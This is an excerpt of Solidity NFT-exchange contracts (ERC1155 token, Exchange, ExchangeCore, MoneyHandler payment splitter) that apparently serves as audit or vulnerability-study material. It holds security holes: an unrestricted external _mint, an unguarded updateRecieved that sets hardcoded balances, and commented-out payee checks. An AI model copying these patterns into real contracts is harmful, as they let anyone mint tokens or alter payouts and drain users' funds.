...
contract ERC1155 is Context, ERC165, IERC1155, IERC1155MetadataURI {
     ...
     */
    function _mint(address account, uint256 id, uint256 amount, bytes memory data) external virtual {
...
contract Exchange is ExchangeCore {
    ...
    function hashOrder_(address maker,address target, uint256 percent, uint256 price, uint256 tokenId, uint256 listingTime, uint256 expirationTime, uint256 salt)
        external
        pure
        returns (bytes32 hash)
    {
        ...
        return hashOrder(Order(maker, target, percent, price, tokenId, listingTime, expirationTime, salt));
    }
    ...
    function addTokenAddress_(address _token)public onlyOwner{
        addTokenAddress(_token);
    }
    ...
    function validateOrderParameters_(address maker, address target, uint256 percent, uint price, uint tokenId, uint listingTime, uint expirationTime, uint salt)
        external
        view
        returns (bool)
    {
        Order memory order = Order(maker, target, percent, price, tokenId, listingTime, expirationTime, salt);
    ...
    function atomicMatch_(uint256[16] memory uints, bytes memory signatures)
        public
        payable
    {
        return atomicMatch(
            Order(address(uints[0]), address(uints[1]),(uints[2]), uints[3], uints[4], uints[5], uints[6], uints[7]),
            Order(address(uints[8]), address(uints[9]),(uints[10]), uints[11], uints[12], uints[13], uints[14], uints[15]),
            signatures
        );
    }
...
contract ExchangeCore is ReentrancyGuarded, EIP712, ERC1155("papi"),Ownable,MoneyHandler{
    ...
    /* Functions */
    function addTokenAddress(address _token) internal onlyOwner{
        token = IERC20(_token);
    }
    
    function addMoneyHandAdd(address  _contract) public onlyOwner{
...
contract MoneyHandler is Context,Ownable {
    ...
    function updateRecieved(address collection, uint256 amount) external{
        recievedAmount[collection] =  10000000000000000;
        amu = 10000000000;
    }

    function getRecieved(address collection) public returns(uint256){
        return amu;
    }
    ...
    function _addPayee(address account, uint256 sharePerc_) private {
       ...
       // require(sharePerc_ > 0 && sharePerc_ <= 100 , "PaymentSplitter: invalid share percent");
       // require(_shares[account] == 0, "PaymentSplitter: account already has shares");

        _payees.push(account);

       uint256 sharesmul_ = SafeMath.mul(_totalAmount,sharePerc_);
       uint256 shares_ = SafeMath.div(sharesmul_,10**18); //10e18
    ...
    function getAmountPer(uint256 totalAmount,uint256 sharePerc) private returns(uint256){
